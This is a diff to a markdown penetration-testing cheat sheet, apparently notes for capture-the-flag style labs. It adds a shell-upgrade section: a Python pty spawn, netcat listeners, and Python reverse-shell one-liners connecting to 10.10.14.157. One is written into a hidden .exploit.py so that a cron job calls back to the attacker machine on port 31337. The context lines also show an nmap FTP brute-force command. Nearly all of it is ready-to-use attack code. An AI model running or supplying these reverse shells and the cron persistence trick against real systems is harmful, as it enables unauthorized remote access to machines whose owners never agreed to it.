@@ -182,9 +182,18 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 # 10. shell upgrade <a name="shell"></a>
 
+- __`python -c 'import pty; pty.spawn("/bin/bash")'`__
+
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+- __`nc -lnvp 1235`__
+
+- __This script, once triggered by the cron, connects back to my attacker machine using a reverse shell on port 31337.__
+```
+echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
+```
+- __`nc -lnvp 31337`__
 
 # 10. [Password Cracking](/hash_cracking.md)
 
